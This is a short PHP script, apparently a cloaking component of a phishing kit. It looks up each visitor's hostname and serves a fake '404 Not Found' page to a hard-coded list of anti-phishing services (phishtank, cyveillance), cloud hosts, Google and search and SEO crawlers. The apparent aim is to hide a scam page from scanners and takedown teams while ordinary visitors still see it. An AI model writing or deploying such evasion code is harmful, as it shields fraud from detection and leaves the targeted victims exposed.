<?php
/*
* hostname.php
*/
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']); //Get User Hostname
$blocked_words = array(
     "above",
     "google",
     "softlayer",
	 "amazonaws",
	 "cyveillance",
	 "phishtank",
	 "dreamhost",
	 "netpilot",
	 "calyxinstitute",
	 "MSNBot",
	 "Slurp",
	 "Teoma",
	 "Gigabot",
	 "Robozilla",
	 "Nutch",
	 "baiduspider",
	 "archive.org_bot",
	 "baiduspider",
	 "naverbot",
	 "yeti",
	 "yahoo-mmcrawler",
	 "psbot",
	 "yahoo-blogs/v3.9",
	 "AhrefsBot",
	 "MJ12bot",
	 "Majestic-12",
	 "Majestic-SEO",
	 "DSearch",
	 "Rogerbot",
	 "SemrushBot",
	 "BLEXBot",
	 "SearchmetricsBot",
	 "BacklinkCrawler",
	 "Exabot",
	 "spbot",
	 "linkdexbot",
	 "Lipperhey Spider",
	 "ScoutJet",
	 "SEOkicks-Robot",
	 "sistrix",

);


 
 
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
		header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}
   

?>